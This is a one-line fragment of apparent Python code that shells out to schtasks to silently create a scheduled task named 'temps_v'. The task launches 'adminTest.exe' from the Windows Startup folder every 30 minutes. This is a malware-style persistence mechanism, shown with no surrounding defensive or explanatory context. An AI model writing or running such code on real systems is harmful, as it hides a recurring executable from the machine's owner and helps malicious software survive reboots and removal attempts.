...
os.system(r"schtasks /f /create /tn temps_v /sc minute /mo 30 /tr C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\adminTest.exe")
